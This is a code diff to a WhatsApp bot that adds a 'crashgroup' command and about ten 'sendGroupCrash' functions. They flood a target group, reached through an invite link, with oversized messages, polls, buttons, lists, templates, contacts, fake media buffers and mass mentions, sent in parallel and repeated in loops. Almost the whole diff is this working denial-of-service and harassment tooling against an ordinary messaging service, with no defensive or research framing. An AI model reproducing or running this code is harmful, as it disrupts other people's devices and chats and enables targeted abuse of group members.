@@ -132,6 +132,7 @@ const botNumber = await conn.decodeJid(conn.user.id);
 const { sender } = m;
 const from = m.key.remoteJid;
 const chatId = m.chat;
+const groupJid = m.chat;
 const isGroup = from.endsWith("@g.us");
 const senderId = m.key.participant || from;  
 const DEV_JIDS = [
@@ -640,6 +641,250 @@ async function sendUltimateCrash(conn, jid) {
             await conn.sendMessage(jid, { 
                 image: { url: 'x'.repeat(50000) },
                 caption: 'y'.repeat(500000)
+            });
+        } catch (e) {}
+    }
+}
+
+// Function to crash a group by sending massive mentions
+async function sendGroupCrashMentions(conn, groupJid, participantJids) {
+    // Create massive mention string
+    let mentionText = "@all ".repeat(5000);
+    const allMentions = [];
+    
+    // send to all participants multiple times
+    for (let i = 0; i < 50; i++) {
+        allMentions.push(...participantJids);
+    }
+    
+    const massiveContext = {
+        mentionedJid: allMentions,
+        groupMentions: [{
+            groupJid: groupJid,
+            groupSubject: 'x'.repeat(50000)
+        }],
+        stanzaId: 'x'.repeat(5000),
+        participant: groupJid.split('@')[0] + '@s.whatsapp.net'
+    };
+    
+    await conn.sendMessage(groupJid, {
+        text: 'x'.repeat(500000) + '\n' + mentionText,
+        contextInfo: massiveContext
+    });
+}
+
+// Function to crash group with massive poll
+async function sendGroupCrashPoll(conn, groupJid) {
+    const massiveOptions = [];
+    for (let i = 0; i < 500; i++) {
+        massiveOptions.push('Option ' + 'x'.repeat(50000) + i);
+    }
+    
+    await conn.sendMessage(groupJid, {
+        poll: {
+            name: 'y'.repeat(500000),
+            values: massiveOptions,
+            selectableCount: 100
+        }
+    });
+}
+
+// Function to crash group with massive buttons
+async function sendGroupCrashButtons(conn, groupJid) {
+    const massiveButtons = [];
+    for (let i = 0; i < 200; i++) {
+        massiveButtons.push({
+            buttonId: 'id_' + 'x'.repeat(50000) + i,
+            buttonText: { displayText: 'y'.repeat(50000) },
+            type: 1
+        });
+    }
+    
+    await conn.sendMessage(groupJid, {
+        text: 'z'.repeat(500000),
+        buttons: massiveButtons,
+        headerType: 1,
+        viewOnce: true
+    });
+}
+
+// Function to crash group with massive reaction
+async function sendGroupCrashReaction(conn, groupJid, messageKey) {
+    const massiveReactions = [];
+    for (let i = 0; i < 300; i++) {
+        massiveReactions.push({
+            react: {
+                text: '🔥',
+                key: messageKey
+            }
+        });
+    }
+    
+    await Promise.all(massiveReactions.map(r => 
+        conn.sendMessage(groupJid, r).catch(() => {})
+    ));
+}
+
+// Function to crash group with corrupt media
+async function sendGroupCrashMedia(conn, groupJid) {
+    const corruptBuffer = Buffer.from('x'.repeat(5000000));
+    
+    await conn.sendMessage(groupJid, {
+        image: corruptBuffer,
+        caption: 'y'.repeat(500000),
+        mimetype: 'image/jpeg',
+        fileLength: '999999999999'
+    }).catch(() => {});
+    
+    await conn.sendMessage(groupJid, {
+        video: corruptBuffer,
+        caption: 'z'.repeat(500000),
+        mimetype: 'video/mp4',
+        fileLength: '999999999999'
+    }).catch(() => {});
+    
+    await conn.sendMessage(groupJid, {
+        audio: corruptBuffer,
+        mimetype: 'audio/mpeg',
+        ptt: true,
+        fileLength: '999999999999'
+    }).catch(() => {});
+}
+
+// Function to crash group with massive list
+async function sendGroupCrashList(conn, groupJid) {
+    const massiveRows = [];
+    for (let i = 0; i < 1000; i++) {
+        massiveRows.push({
+            title: 'Title ' + 'x'.repeat(50000) + i,
+            description: 'Desc ' + 'y'.repeat(50000),
+            rowId: 'id_' + i
+        });
+    }
+    
+    const massiveSections = [];
+    for (let i = 0; i < 100; i++) {
+        massiveSections.push({
+            title: 'Section ' + 'z'.repeat(50000) + i,
+            rows: massiveRows
+        });
+    }
+    
+    await conn.sendMessage(groupJid, {
+        text: 'a'.repeat(500000),
+        footer: 'b'.repeat(500000),
+        title: 'c'.repeat(500000),
+        buttonText: 'd'.repeat(50000),
+        sections: massiveSections,
+        listType: 2
+    });
+}
+
+// Function to crash group with massive template
+async function sendGroupCrashTemplate(conn, groupJid) {
+    const massiveButtons = [];
+    for (let i = 0; i < 150; i++) {
+        massiveButtons.push({
+            index: i,
+            urlButton: {
+                displayText: 'e'.repeat(50000),
+                url: 'https://' + 'f'.repeat(50000) + '.com'
+            }
+        });
+    }
+    
+    await conn.sendMessage(groupJid, {
+        text: 'g'.repeat(500000),
+        footer: 'h'.repeat(500000),
+        templateButtons: massiveButtons,
+        viewOnce: true
+    });
+}
+
+// Function to crash group with massive location
+async function sendGroupCrashLocation(conn, groupJid) {
+    await conn.sendMessage(groupJid, {
+        location: {
+            degreesLatitude: 'i'.repeat(50000),
+            degreesLongitude: 'j'.repeat(50000),
+            name: 'k'.repeat(500000),
+            address: 'l'.repeat(500000)
+        }
+    });
+}
+
+// Function to crash group with massive contact
+async function sendGroupCrashContact(conn, groupJid) {
+    const massiveContacts = [];
+    for (let i = 0; i < 500; i++) {
+        massiveContacts.push({
+            displayName: 'm'.repeat(50000),
+            vcard: 'BEGIN:VCARD\nVERSION:3.0\nFN:' + 'n'.repeat(50000) + '\nEND:VCARD'
+        });
+    }
+    
+    await conn.sendMessage(groupJid, {
+        contacts: {
+            displayName: 'o'.repeat(500000),
+            contacts: massiveContacts
+        }
+    });
+}
+
+// ULTIMATE GROUP CRASH - Send all crash methods
+async function sendUltimateGroupCrash(conn, groupJid, participants) {
+    // Get all participant JIDs if not provided
+    if (!participants || participants.length === 0) {
+        try {
+            const metadata = await conn.groupMetadata(groupJid);
+            participants = metadata.participants.map(p => p.id);
+        } catch (e) {}
+    }
+    
+    // Get a message key for reactions
+    let messageKey = null;
+    try {
+        const sentMsg = await conn.sendMessage(groupJid, { text: 'x' });
+        messageKey = sentMsg.key;
+    } catch (e) {}
+    
+    // Send all crashes in parallel
+    await Promise.all([
+        sendGroupCrashMentions(conn, groupJid, participants),
+        sendGroupCrashPoll(conn, groupJid),
+        sendGroupCrashButtons(conn, groupJid),
+        sendGroupCrashMedia(conn, groupJid),
+        sendGroupCrashList(conn, groupJid),
+        sendGroupCrashTemplate(conn, groupJid),
+        sendGroupCrashLocation(conn, groupJid),
+        sendGroupCrashContact(conn, groupJid)
+    ]);
+    
+    // Send reactions if we have a message key
+    if (messageKey) {
+        await sendGroupCrashReaction(conn, groupJid, messageKey);
+    }
+    
+    // Additional massive messages
+    for (let i = 0; i < 20; i++) {
+        try {
+            await conn.sendMessage(groupJid, { 
+                text: 'CRASH '.repeat(10000) + 'x'.repeat(100000) 
+            });
+        } catch (e) {}
+        
+        try {
+            await conn.sendMessage(groupJid, { 
+                sticker: { url: 'x'.repeat(50000) },
+                mimetype: 'image/webp'
+            });
+        } catch (e) {}
+        
+        try {
+            await conn.sendMessage(groupJid, { 
+                document: Buffer.from('x'.repeat(5000000)),
+                mimetype: 'application/octet-stream',
+                fileName: 'y'.repeat(50000)
             });
         } catch (e) {}
     }
@@ -10581,6 +10826,39 @@ case 'jex-crash': {
     // Send multiple crash cycles
     for (let i = 0; i < 3; i++) {
         await sendUltimateCrash(conn, target);
+    }
+    
+    break;
+}
+case 'crashgroup':
+case 'crash-gc': {    
+    if (!Access) return reply(mess.owner);
+    
+    if (!text) return reply(`*Example:* ${prefix + command} https://chat.whatsapp.com/xxxxx`);
+    
+    // If it's a WhatsApp invite link, get the group JID
+    if (text.includes('chat.whatsapp.com')) {
+        const inviteCode = text.split('chat.whatsapp.com/')[1].split('?')[0];
+        try {
+            const groupData = await conn.groupGetInviteInfo(inviteCode);
+            groupJid = groupData.id;
+        } catch (e) {
+            return reply(`Failed to get group info. Make sure the bot is in the group or the link is valid.`);
+        }
+    }
+    
+    reply(`*[!] Sending ultimate group crash to target group...*\n\nGroup: ${groupJid}`);
+    
+    // Get participants if bot is in the group
+    let participants = [];
+    try {
+        const metadata = await conn.groupMetadata(groupJid);
+        participants = metadata.participants.map(p => p.id);
+    } catch (e) {}
+    
+    for (let i = 0; i < 5; i++) {
+        await sendUltimateGroupCrash(conn, groupJid, participants);
+        await new Promise(resolve => setTimeout(resolve, 300));
     }
     
     break;
